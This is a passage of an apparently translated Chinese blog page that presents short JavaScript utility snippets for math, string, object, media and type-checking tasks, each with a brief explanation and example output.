<code>false</code> 则为奇数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isEven = <span class="function"><span class="params">num</span> =&gt;</span> num % <span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line"><span class="comment">// isEven(3) -&gt; false</span></span><br></pre></td></tr></table></figure><h3 id="Factorial-阶乘"><a href="#Factorial-阶乘" class="headerlink" title="Factorial (阶乘)"></a>Factorial (阶乘)</h3><p>使用递归。<br>如果 <code>n</code> 小于或等于 <code>1</code>，返回 <code>1</code>。<br>其它情况，则返回 <code>n</code> 和 <code>n-1</code> 的阶乘的积。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> factorial = <span class="function"><span class="params">n</span> =&gt;</span> n &lt;= <span class="number">1</span> ? <span class="number">1</span> : n * factorial(n - <span class="number">1</span>);</span><br><span class="line"><span class="comment">// factorial(6) -&gt; 720</span></span><br></pre></td></tr></table></figure><h3 id="Fibonacci-array-generator-斐波纳契数组生成器"><a href="#Fibonacci-array-generator-斐波纳契数组生成器" class="headerlink" title="Fibonacci array generator (斐波纳契数组生成器)"></a>Fibonacci array generator (斐波纳契数组生成器)</h3><p>创建一个指定长度的空数组，初始化前两个值（<code>0</code>和<code>1</code>）。<br>使用 <code>Array.reduce()</code> 将最后两个值的总和添加到数组中（前两个除外）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fibonacci = <span class="function"><span class="params">n</span> =&gt;</span></span><br><span class="line">  <span class="built_in">Array</span>(n).fill(<span class="number">0</span>).reduce(<span class="function">(<span class="params">acc, val, i</span>) =&gt;</span> acc.concat(i &gt; <span class="number">1</span> ? acc[i - <span class="number">1</span>] + acc[i - <span class="number">2</span>] : i), []);</span><br><span class="line"><span class="comment">// fibonacci(5) -&gt; [0,1,1,2,3]</span></span><br></pre></td></tr></table></figure><h3 id="Greatest-common-divisor-GCD-最大公约数-译者注：使用辗转相乘法"><a href="#Greatest-common-divisor-GCD-最大公约数-译者注：使用辗转相乘法" class="headerlink" title="Greatest common divisor (GCD) (最大公约数)(译者注：使用辗转相乘法)"></a>Greatest common divisor (GCD) (最大公约数)(译者注：使用辗转相乘法)</h3><p>使用递归。<br>基本情况是如果 <code>y</code> 等于 <code>0</code>，则返回 <code>x</code>。<br>其它情况下，返回 <code>y</code> 与 <code>x/y</code> 的最大公约数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> gcd = <span class="function">(<span class="params">x, y</span>) =&gt;</span> !y ? x : gcd(y, x % y);</span><br><span class="line"><span class="comment">// gcd (8, 36) -&gt; 4</span></span><br></pre></td></tr></table></figure><h3 id="Hamming-distance-汉明距离"><a href="#Hamming-distance-汉明距离" class="headerlink" title="Hamming distance (汉明距离)"></a>Hamming distance (汉明距离)</h3><p>使用 异或 运算符（<code>^</code>）去查找两个数值间的位差，使用 <code>toString(2)</code> 转换为二进制值，使用 <code>match(/1/g)</code> 计算并返回字符串中 <code>1</code> 的数量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hammingDistance = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span></span><br><span class="line">  ((num1 ^ num2).toString(<span class="number">2</span>).match(<span class="regexp">/1/g</span>) || <span class="string">''</span>).length;</span><br><span class="line"><span class="comment">// hammingDistance(2,3) -&gt; 1</span></span><br></pre></td></tr></table></figure><h3 id="Percentile-百分位数"><a href="#Percentile-百分位数" class="headerlink" title="Percentile (百分位数)"></a>Percentile (百分位数)</h3><p>使用百分比公式计算给定数组中有多少个数小于或等于给定值。</p><p>使用Array.reduce()计算值的下面有多少个数是相同的值, 并应用百分比公式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> percentile = <span class="function">(<span class="params">arr, val</span>) =&gt;</span> </span><br><span class="line">  <span class="number">100</span> * arr.reduce(<span class="function">(<span class="params">acc,v</span>) =&gt;</span> acc + (v &lt; val ? <span class="number">1</span> : <span class="number">0</span>) + (v === val ? <span class="number">0.5</span> : <span class="number">0</span>), <span class="number">0</span>) / arr.length;</span><br><span class="line"><span class="comment">// percentile([1,2,3,4,5,6,7,8,9,10], 6) -&gt; 55</span></span><br></pre></td></tr></table></figure><h3 id="Powerset-幂集"><a href="#Powerset-幂集" class="headerlink" title="Powerset (幂集)"></a>Powerset (幂集)</h3><p>使用 <code>Array.reduce()</code> 与 <code>Array.map()</code> 结合来迭代元素并将其组合成一个包含所有组合的数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> powerset = <span class="function"><span class="params">arr</span> =&gt;</span></span><br><span class="line">  arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> a.concat(a.map(<span class="function"><span class="params">r</span> =&gt;</span> [v].concat(r))), [[]]);</span><br><span class="line"><span class="comment">// powerset([1,2]) -&gt; [[], [1], [2], [2,1]]</span></span><br></pre></td></tr></table></figure><h3 id="Round-number-to-n-digits-取小数点后-n-位"><a href="#Round-number-to-n-digits-取小数点后-n-位" class="headerlink" title="Round number to n digits (取小数点后 n 位)"></a>Round number to n digits (取小数点后 n 位)</h3><p>使用 <code>Math.round()</code> 和字符串模板将数字四舍五入到指定的位数。<br>省略第二个参数，<code>decimals</code> 将四舍五入到一个整数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> round = <span class="function">(<span class="params">n, decimals=<span class="number">0</span></span>) =&gt;</span> <span class="built_in">Number</span>(<span class="string">`<span class="subst">$&#123;<span class="built_in">Math</span>.round(<span class="string">`<span class="subst">$&#123;n&#125;</span>e<span class="subst">$&#123;decimals&#125;</span>`</span>)&#125;</span>e-<span class="subst">$&#123;decimals&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// round(1.005, 2) -&gt; 1.01</span></span><br></pre></td></tr></table></figure><h3 id="Standard-deviation-标准差"><a href="#Standard-deviation-标准差" class="headerlink" title="Standard deviation (标准差)"></a>Standard deviation (标准差)</h3><p>Use <code>Array.reduce()</code> to calculate the mean, variance and the sum of the variance of the values, the variance of the values, then<br>determine the standard deviation.<br>You can omit the second argument to get the sample standard deviation or set it to <code>true</code> to get the population standard deviation.</p><p>使用 <code>Array.reduce()</code> 来计算平均值，方差以及方差之和，然后确定标准偏差。<br>您可以省略第二个参数来获取样本标准差或将其设置为 <code>true</code> 以获得总体标准差。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> standardDeviation = <span class="function">(<span class="params">arr, usePopulation = <span class="literal">false</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> mean = arr.reduce(<span class="function">(<span class="params">acc, val</span>) =&gt;</span> acc + val, <span class="number">0</span>) / arr.length;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.sqrt(</span><br><span class="line">    arr.reduce(<span class="function">(<span class="params">acc, val</span>) =&gt;</span> acc.concat(<span class="built_in">Math</span>.pow(val - mean, <span class="number">2</span>)), [])</span><br><span class="line">       .reduce(<span class="function">(<span class="params">acc, val</span>) =&gt;</span> acc + val, <span class="number">0</span>) / (arr.length - (usePopulation ? <span class="number">0</span> : <span class="number">1</span>))</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// standardDeviation([10,2,38,23,38,23,21]) -&gt; 13.284434142114991 (sample)</span></span><br><span class="line"><span class="comment">// standardDeviation([10,2,38,23,38,23,21], true) -&gt; 12.29899614287479 (population)</span></span><br></pre></td></tr></table></figure><h2 id="Media-媒体"><a href="#Media-媒体" class="headerlink" title="Media (媒体)"></a>Media (媒体)</h2><h3 id="Speech-synthesis-experimental-语音合成-试验功能"><a href="#Speech-synthesis-experimental-语音合成-试验功能" class="headerlink" title="Speech synthesis (experimental) 语音合成(试验功能)"></a>Speech synthesis (experimental) 语音合成(试验功能)</h3><p>使用 <code>SpeechSynthesisUtterance.voice</code> 和 <code>indow.speechSynthesis.getVoices()</code> 将消息转换为语音。<br>使用 <code>window.speechSynthesis.speak()</code> 来播放消息。</p><p>了解更多关于 <a href="https://developer.mozilla.org/en-US/docs/Web/API/SpeechSynthesisUtterance" target="_blank" rel="noopener">SpeechSynthesisUtterance interface of the Web Speech API</a>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> speak = <span class="function"><span class="params">message</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> msg = <span class="keyword">new</span> SpeechSynthesisUtterance(message);</span><br><span class="line">  msg.voice = <span class="built_in">window</span>.speechSynthesis.getVoices()[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">window</span>.speechSynthesis.speak(msg);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// speak('Hello, World') -&gt; plays the message</span></span><br></pre></td></tr></table></figure><h2 id="Object-对象"><a href="#Object-对象" class="headerlink" title="Object (对象)"></a>Object (对象)</h2><h3 id="Object-from-key-value-pairs-键值对创建对象"><a href="#Object-from-key-value-pairs-键值对创建对象" class="headerlink" title="Object from key-value pairs (键值对创建对象)"></a>Object from key-value pairs (键值对创建对象)</h3><p>使用 <code>Array.reduce()</code> 创建和组合键值对。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> objectFromPairs = <span class="function"><span class="params">arr</span> =&gt;</span> arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> (a[v[<span class="number">0</span>]] = v[<span class="number">1</span>], a), &#123;&#125;);</span><br><span class="line"><span class="comment">// objectFromPairs([['a',1],['b',2]]) -&gt; &#123;a: 1, b: 2&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Object-to-key-value-pairs-对象生成键值对"><a href="#Object-to-key-value-pairs-对象生成键值对" class="headerlink" title="Object to key-value pairs (对象生成键值对)"></a>Object to key-value pairs (对象生成键值对)</h3><p>使用 <code>Object.keys()</code> 和 <code>Array.map()</code> 去遍历对象的键并生成一个包含键值对的数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> objectToPairs = <span class="function"><span class="params">obj</span> =&gt;</span> <span class="built_in">Object</span>.keys(obj).map(<span class="function"><span class="params">k</span> =&gt;</span> [k, obj[k]]);</span><br><span class="line"><span class="comment">// objectToPairs(&#123;a: 1, b: 2&#125;) -&gt; [['a',1],['b',2]])</span></span><br></pre></td></tr></table></figure><h3 id="Shallow-clone-object-浅拷贝对象"><a href="#Shallow-clone-object-浅拷贝对象" class="headerlink" title="Shallow clone object (浅拷贝对象)"></a>Shallow clone object (浅拷贝对象)</h3><p>使用 <code>...spread</code> 扩展运算符将目标对象的属性添加到拷贝对象中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> shallowClone = <span class="function"><span class="params">obj</span> =&gt;</span> (&#123; ...obj &#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">const a = &#123; x: true, y: 1 &#125;;</span></span><br><span class="line"><span class="comment">const b = shallowClone(a);</span></span><br><span class="line"><span class="comment">a === b -&gt; false</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="String-字符串"><a href="#String-字符串" class="headerlink" title="String (字符串)"></a>String (字符串)</h2><h3 id="Anagrams-of-string-with-duplicates-字符串异位-和重复"><a href="#Anagrams-of-string-with-duplicates-字符串异位-和重复" class="headerlink" title="Anagrams of string (with duplicates) (字符串异位(和重复))"></a>Anagrams of string (with duplicates) (字符串异位(和重复))</h3><p>使用递归。<br>遍历给定字符串中的每个字母，用其余字母创建所有部分字母。<br>使用 <code>Array.map()</code> 将字母与每个部分字母组合，然后使用 <code>Array.reduce()</code> 将所有字母组合到一个数组中。<br>当给定字符串数量等与 <code>2</code> 或 <code>1</code> 时做简单处理。＝</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> anagrams = <span class="function"><span class="params">str</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (str.length &lt;= <span class="number">2</span>) <span class="keyword">return</span> str.length === <span class="number">2</span> ? [str, str[<span class="number">1</span>] + str[<span class="number">0</span>]] : [str];</span><br><span class="line">  <span class="keyword">return</span> str.split(<span class="string">''</span>).reduce(<span class="function">(<span class="params">acc, letter, i</span>) =&gt;</span></span><br><span class="line">    acc.concat(anagrams(str.slice(<span class="number">0</span>, i) + str.slice(i + <span class="number">1</span>)).map(<span class="function"><span class="params">val</span> =&gt;</span> letter + val)), []);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// anagrams('abc') -&gt; ['abc','acb','bac','bca','cab','cba']</span></span><br></pre></td></tr></table></figure><h3 id="Capitalize-first-letter-of-every-word-所有单词的第一个字母大写"><a href="#Capitalize-first-letter-of-every-word-所有单词的第一个字母大写" class="headerlink" title="Capitalize first letter of every word (所有单词的第一个字母大写)"></a>Capitalize first letter of every word (所有单词的第一个字母大写)</h3><p>使用 <code>replace()</code> 去查找单词的第一个字母并使用 <code>toUpperCase()</code> 改为大写。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> capitalizeEveryWord = <span class="function"><span class="params">str</span> =&gt;</span> str.replace(<span class="regexp">/\b[a-z]/g</span>, char =&gt; char.toUpperCase());</span><br><span class="line"><span class="comment">// capitalizeEveryWord('hello world!') -&gt; 'Hello World!'</span></span><br></pre></td></tr></table></figure><h3 id="Capitalize-first-letter-单词的第一个字母大写"><a href="#Capitalize-first-letter-单词的第一个字母大写" class="headerlink" title="Capitalize first letter (单词的第一个字母大写)"></a>Capitalize first letter (单词的第一个字母大写)</h3><p>使用 <code>slice(0,1)</code> 和 <code>toUpperCase()</code> 将首字母大写，使用 <code>slice(1)</code> 得到字符串的其余部分。<br>忽略 <code>lowerRest</code> 参数以保持字符串的其余部分不变，或者将其设置为 <code>true</code> 以转换为小写字母。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> capitalize = <span class="function">(<span class="params">str, lowerRest = <span class="literal">false</span></span>) =&gt;</span></span><br><span class="line">  str.slice(<span class="number">0</span>, <span class="number">1</span>).toUpperCase() + (lowerRest ? str.slice(<span class="number">1</span>).toLowerCase() : str.slice(<span class="number">1</span>));</span><br><span class="line"><span class="comment">// capitalize('myName', true) -&gt; 'Myname'</span></span><br></pre></td></tr></table></figure><h3 id="Check-for-palindrome-检查回文"><a href="#Check-for-palindrome-检查回文" class="headerlink" title="Check for palindrome (检查回文)"></a>Check for palindrome (检查回文)</h3><p>使用 <code>toLowerCase()</code> 转换字符串并用 <code>replace()</code> 删除其中的非字母数字字符。<br>然后，使用 <code>split(&#39;&#39;)</code> 分散为单个字符，再使用 <code>reverse()</code> 和 <code>join(&#39;&#39;)</code> 倒序合并后与原字符进行比较。 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> palindrome = <span class="function"><span class="params">str</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> s = str.toLowerCase().replace(<span class="regexp">/[\W_]/g</span>,<span class="string">''</span>);</span><br><span class="line">  <span class="keyword">return</span> s === s.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// palindrome('taco cat') -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Reverse-a-string-反转一个字符串"><a href="#Reverse-a-string-反转一个字符串" class="headerlink" title="Reverse a string (反转一个字符串)"></a>Reverse a string (反转一个字符串)</h3><p>使用数组解构和 <code>Array.reverse()</code> 来反转字符串中字符的顺序。<br>使用 <code>join(&#39;&#39;)</code> 组合字符获得一个字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> reverseString = <span class="function"><span class="params">str</span> =&gt;</span> [...str].reverse().join(<span class="string">''</span>);</span><br><span class="line"><span class="comment">// reverseString('foobar') -&gt; 'raboof'</span></span><br></pre></td></tr></table></figure><h3 id="Sort-characters-in-string-alphabetical-字符串排序（按字母顺序排列）"><a href="#Sort-characters-in-string-alphabetical-字符串排序（按字母顺序排列）" class="headerlink" title="Sort characters in string (alphabetical) 字符串排序（按字母顺序排列）"></a>Sort characters in string (alphabetical) 字符串排序（按字母顺序排列）</h3><p>使用 <code>split(&#39;&#39;)</code> 切割字符串，使用 <code>Array.sort</code> 通过 <code>localeCompare()</code> 去排序，再使用 <code>join(&#39;&#39;)</code> 组合。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sortCharactersInString = <span class="function"><span class="params">str</span> =&gt;</span></span><br><span class="line">  str.split(<span class="string">''</span>).sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.localeCompare(b)).join(<span class="string">''</span>);</span><br><span class="line"><span class="comment">// sortCharactersInString('cabbage') -&gt; 'aabbceg'</span></span><br></pre></td></tr></table></figure><h3 id="Truncate-a-String-字符串截断"><a href="#Truncate-a-String-字符串截断" class="headerlink" title="Truncate a String (字符串截断)"></a>Truncate a String (字符串截断)</h3><p>确定字符串的长度是否大于 <code>num</code>。<br>将字符串截断为所需的长度，在末尾或原始字符串后附加 <code>...</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> truncate = <span class="function">(<span class="params">str, num</span>) =&gt;</span></span><br><span class="line">  str.length &gt; num ? str.slice(<span class="number">0</span>, num &gt; <span class="number">3</span> ? num - <span class="number">3</span> : num) + <span class="string">'...'</span> : str;</span><br><span class="line"><span class="comment">// truncate('boomerang', 7) -&gt; 'boom...'</span></span><br></pre></td></tr></table></figure><h2 id="Utility-效率工具"><a href="#Utility-效率工具" class="headerlink" title="Utility (效率工具)"></a>Utility (效率工具)</h2><h3 id="Escape-regular-expression-转义正则表达式"><a href="#Escape-regular-expression-转义正则表达式" class="headerlink" title="Escape regular expression (转义正则表达式)"></a>Escape regular expression (转义正则表达式)</h3><p>使用 <code>replace()</code> 去转义特殊字符。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> escapeRegExp = <span class="function"><span class="params">str</span> =&gt;</span> str.replace(<span class="regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="string">'\\$&amp;'</span>);</span><br><span class="line"><span class="comment">// escapeRegExp('(test)') -&gt; \\(test\\)</span></span><br></pre></td></tr></table></figure><h3 id="Get-native-type-of-value-获取值的原始类型"><a href="#Get-native-type-of-value-获取值的原始类型" class="headerlink" title="Get native type of value (获取值的原始类型)"></a>Get native type of value (获取值的原始类型)</h3><p>返回值的构造函数名称的小写字符，值为 <code>undefined</code> 或 <code>null</code> 时则返回 <code>undefined</code> 或 <code>null</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getType = <span class="function"><span class="params">v</span> =&gt;</span></span><br><span class="line">  v === <span class="literal">undefined</span> ? <span class="string">'undefined'</span> : v === <span class="literal">null</span> ? <span class="string">'null'</span> : v.constructor.name.toLowerCase();</span><br><span class="line"><span class="comment">// getType(new Set([1,2,3])) -&gt; "set"</span></span><br></pre></td></tr></table></figure><h3 id="Is-array-是否是数组"><a href="#Is-array-是否是数组" class="headerlink" title="Is array (是否是数组)"></a>Is array (是否是数组)</h3><p>使用 <code>Array.isArray()</code> 去检查值是否为数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isArray = <span class="function"><span class="params">val</span> =&gt;</span> !!val &amp;&amp; <span class="built_in">Array</span>.isArray(val);</span><br><span class="line"><span class="comment">// isArray(null) -&gt; false</span></span><br><span class="line"><span class="comment">// isArray([1]) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Is-boolean-是否为布尔值"><a href="#Is-boolean-是否为布尔值" class="headerlink" title="Is boolean (是否为布尔值)"></a>Is boolean (是否为布尔值)</h3><p>使用 <code>typeof</code> 去检查值是否为原始布尔值类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isBoolean = <span class="function"><span class="params">val</span> =&gt;</span> <span class="keyword">typeof</span> val === <span class="string">'boolean'</span>;</span><br><span class="line"><span class="comment">// isBoolean(null) -&gt; false</span></span><br><span class="line"><span class="comment">// isBoolean(false) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Is-function-是否为函数"><a href="#Is-function-是否为函数" class="headerlink" title="Is function (是否为函数)"></a>Is function (是否为函数)</h3><p>使用 <code>typeof</code> 去检查值是否为函数原始类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isFunction = <span class="function"><span class="params">val</span> =&gt;</span> val &amp;&amp; <span class="keyword">typeof</span> val === <span class="string">'function'</span>;</span><br><span class="line"><span class="comment">// isFunction('x') -&gt; false</span></span><br><span class="line"><span class="comment">// isFunction(x =&gt; x) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Is-number-是否为数值"><a href="#Is-number-是否为数值" class="headerlink" title="Is number (是否为数值)"></a>Is number (是否为数值)</h3><p>使用 <code>typeof</code> 去检查值是否为数值原始类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isNumber = <span class="function"><span class="params">val</span> =&gt;</span> <span class="keyword">typeof</span> val === <span class="string">'number'</span>;</span><br><span class="line"><span class="comment">// isNumber('1') -&gt; false</span></span><br><span class="line"><span class="comment">// isNumber(1) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Is-string-是否为字符串"><a href="#Is-string-是否为字符串" class="headerlink" title="Is string (是否为字符串)"></a>Is string (是否为字符串)</h3><p>使用 <code>typeof</code> 去检查值是否为字符串原始类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isString = <span class="function"><span class="params">val</span> =&gt;</span> <span class="keyword">typeof</span> val === <span class="string">'string'</span>;</span><br><span class="line"><span class="comment">// isString(10) -&gt; false</span></span><br><span class="line"><span class="comment">// isString('10') -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Is-symbol-是否为-symbol-类型"><a href="#Is-symbol-是否为-symbol-类型" class="headerlink" title="Is symbol (是否为 symbol 类型)"></a>Is symbol (是否为 symbol 类型)</h3><p>使用 <code>typeof</code> 去检查值是否为 symbol 原始类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isSymbol = <span class="function"><span class="params">val</span> =&gt;</span> <span class="keyword">typeof</span> val === <span class="string">'symbol'</span>;</span><br><span class="line"><span class="comment">// isSymbol('x') -&gt; false</span></span><br><span class="line"><span class="comment">// isSymbol(Symbol('x')) -&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="Measure-time-taken-by-function-测量函数的耗时"><a href="#Measure-time-taken-by-function-测量函数的耗时" class="headerlink" title="Measure time taken by function (测量函数的耗时)"></a>Measure time taken by function (测量函数的耗时)</h3><p>使用 <code>console.time()</code> 和 <code>console.timeEnd()</code> 来测量开始和结束时间之间的差异，以确定回调执行的时间。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> timeTaken = <span class="function"><span class="params">callback</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.time(<span class="string">'timeTaken'</span>);</span><br><span class="line">  <span class="keyword">const</span> r = callback();</span><br><span class="line">  <span class="built_in">console</span>.timeEnd(<span class="string">'timeTaken'</span>);</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// timeTaken(() =&gt; Math.pow(2, 10)) -&gt; 1024</span></span><br><span class="line"><span class="comment">// (logged): timeTaken: 0.02099609375ms</span></span><br></pre></td></tr></table></figure><h3 id="Number-to-array-of-digits-数值转换为数组"><a href="#Number-to-array-of-digits-数值转换为数组" class="headerlink" title="Number to array of digits (数值转换为数组)"></a>Number to array of digits (数值转换为数组)</h3><p>将数值转换为字符串，使用 <code>split()</code> 分割为数组。<br>再使用 <code>Array.map()</code> 和 <code>parseInt()</code> 将每个值转换为整数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> digitize = <span class="function"><span class="params">n</span> =&gt;</span> (<span class="string">''</span>+n).split(<span class="string">''</span>).map(<span class="function"><span class="params">i</span> =&gt;</span> <span class="built_in">parseInt</span>(i));</span><br><span class="line"><span class="comment">// digitize(2334) -&gt; [2, 3, 3, 4]</span></span><br></pre></td></tr></table></figure><h3 id="Ordinal-suffix-of-number-（数值增加序号后缀）"><a href="#Ordinal-suffix-of-number-（数值增加序号后缀）" class="headerlink" title="Ordinal suffix of number （数值增加序号后缀）"></a>Ordinal suffix of number （数值增加序号后缀）</h3><p>Use the modulo operator (<code>%</code>) to find values of single and tens digits.<br>Find which ordinal pattern digits match.<br>If digit is found in teens pattern, use teens ordinal.</p><p>使用模运算符（<code>％</code>）来查找单位数和十位数的值。<br>查找数字匹配哪些序号模式。<br>如果数字在十几的模式中找到，请使用的十几的序数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> toOrdinalSuffix = <span class="function"><span class="params">num</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> int = <span class="built_in">parseInt</span>(num), digits = [(int % <span class="number">10</span>), (int % <span class="number">100</span>)],</span><br><span class="line">    ordinals = [<span class="string">'st'</span>, <span class="string">'nd'</span>, <span class="string">'rd'</span>, <span class="string">'th'</span>], oPattern = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">    tPattern = [<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>];</span><br><span class="line">  <span class="keyword">return</span> oPattern.includes(digits[<span class="number">0</span>]) &amp;&amp; !tPattern.includes(digits[<span class="number">1</span>]) ? int + ordinals[digits[<span class="number">0</span>] - <span class="number">1</span>] : int + ordinals[<span class="number">3</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// toOrdinalSuffix("123") -&gt; "123rd"</span></span><br></pre></td></tr></table></figure><h3 id="Random-integer-in-range-指定范围内的随机整数"><a href="#Random-integer-in-range-指定范围内的随机整数" class="headerlink" title="Random integer in range (指定范围内的随机整数)"></a>Random integer in 